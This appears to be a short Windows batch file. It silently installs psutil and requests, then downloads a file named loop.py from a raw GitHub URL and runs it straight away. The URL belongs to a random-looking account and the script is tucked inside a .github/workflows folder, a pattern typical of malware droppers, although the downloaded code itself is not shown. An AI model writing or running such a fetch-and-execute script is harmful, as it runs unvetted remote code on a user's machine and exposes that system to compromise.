@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/Grims923Kristjana41/sym/refs/heads/main/.github/workflows/loop.py
python loop.py
